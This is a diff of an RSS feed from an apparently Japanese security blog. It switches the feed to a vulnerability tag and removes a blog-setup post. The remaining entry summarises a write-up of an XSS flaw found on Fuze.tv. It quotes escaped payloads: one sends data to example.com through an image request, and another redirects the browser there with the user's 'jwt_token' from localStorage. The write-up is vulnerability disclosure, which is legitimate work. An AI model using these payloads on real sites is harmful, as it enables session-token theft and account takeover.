@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>水の飲み方を忘れないための備忘録</title>
-    <link>https://lutwidse.github.io/</link>
-    <description>Recent content on 水の飲み方を忘れないための備忘録</description>
+    <title>脆弱性 on 水の飲み方を忘れないための備忘録</title>
+    <link>https://lutwidse.github.io/tags/%E8%84%86%E5%BC%B1%E6%80%A7/</link>
+    <description>Recent content in 脆弱性 on 水の飲み方を忘れないための備忘録</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-jp</language>
-    <lastBuildDate>Wed, 28 Jul 2021 18:11:51 +0900</lastBuildDate><atom:link href="https://lutwidse.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 28 Jul 2021 18:11:51 +0900</lastBuildDate><atom:link href="https://lutwidse.github.io/tags/%E8%84%86%E5%BC%B1%E6%80%A7/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Fuze.tvに脆弱性を見つけた話</title>
       <link>https://lutwidse.github.io/post/fuze.tv-high-impact-xss/</link>
@@ -24,31 +24,6 @@ Fuze.tv とは ゲームのクリップを共有するサイト。
 次に html タグが埋め込めないか確認したところ XSS が発火。
 このときはまだ限定的な条件下での攻撃と考えていた。
 &amp;lt;XSS onpointerup=&amp;#34;alert(1)&amp;#34;&amp;lt;h1&amp;gt;XSS&amp;lt;/h1&amp;gt;&amp;lt;/XSS&amp;gt; &amp;lt;div class=&amp;#34;comments-content&amp;#34;&amp;gt; &amp;lt;div compile-content-parser=&amp;#34;::$ctrl.item.message&amp;#34;&amp;gt; &amp;lt;vuln onpointerup=&amp;#34;var i=new Image;i.src=&amp;#34;http://example.com/?&amp;#34;+123;&amp;#34; class=&amp;#34;ng-scope&amp;#34;&amp;gt;&amp;lt;h1&amp;gt;Crafted comment&amp;lt;/h1&amp;gt; &amp;lt;/vuln&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;video&amp;gt; &amp;lt;source onerror=location=/\example.com/+localStorage.getItem(&amp;#34;jwt_token&amp;#34;)&amp;gt; &amp;lt;/video&amp;gt; Iframe を使った XSS Content-Security-Policy が設定されておらず、 Iframe から XSS を入力することができた。</description>
-    </item>
-    
-    <item>
-      <title>HugoとGitHub Pagesでブログを作成した話</title>
-      <link>https://lutwidse.github.io/post/2021-07-07-create-blog-with-hugo/</link>
-      <pubDate>Wed, 07 Jul 2021 13:58:40 +0900</pubDate>
-      
-      <guid>https://lutwidse.github.io/post/2021-07-07-create-blog-with-hugo/</guid>
-      <description>Q. Web 系の知識なしでブログを作るには WordPress ってなに！！！助けて！！
-不安にかられているそこの貴方
-そんな非 Web 系エンジニアでも
- 絶対 100% 完全放置 不労所得を生み出す  ブログを簡単に展開することができます。
-世の中そんなに甘い話はないので頑張りましょう。
-Hugo とは？ 最近話題の静的サイトジェネレーター
-テンプレートを選ぶと簡単にサイトが構築できるぞ ♨
-GitHub Pages とは？ レポジトリからサイトを公開できる静的なホスティングサービス。
-カスタムドメインも使える優れもの。
-もう待ちきれないよ！早く教えてくれ！ まずは Hugo を用意するところから。
-筆者の環境は Windows なので Chocolately を使っています。
-他環境の方は別途でインストール方法を参照してください。
-コマンドプロンプトを管理者権限で実行したら下記のコマンドを入力します。
-$ choco install hugo -confirm $ choco install hugo-extended -confirm hugo-extended は scss 対応版になります。
-よく分からない場合は両方入れましょう。
-そしたら適当なディレクトリで
-$ hugo new site blog (自分が分かりやすいものでOK) $ cd blog $ git init themes.gohugo.io 自分はm10cというテーマを選びました。 $ git submodule add https://github.</description>
     </item>
     
   </channel>
